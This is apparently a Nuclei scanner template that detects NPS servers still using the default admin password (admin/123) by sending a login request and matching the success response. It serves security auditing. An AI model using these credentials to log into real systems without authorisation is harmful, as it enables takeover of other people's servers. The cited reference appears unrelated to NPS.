id: nps-default-login

info:
  name: NPS 默认口令登录（弱口令）
  author: pikpikcu
  severity: high
  description: 该模板通过尝试 NPS 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://docs.microfocus.com/NNMi/10.30/Content/Administer/Hardening/confCC2b_pwd.htm
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
  tags: nps,default-login,vuln

http:
  - raw:
      - |
        POST /login/verify HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{Hostname}}/login/index

        username={{username}}&password={{password}}

    payloads:
      username:
        - admin
      password:
        - 123
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "application/json"
        part: header
        condition: and

      - type: word
        words:
          - '"msg": "login success"'
          - '"status": 1'
        part: body
        condition: and

      - type: status
        status:
          - 200
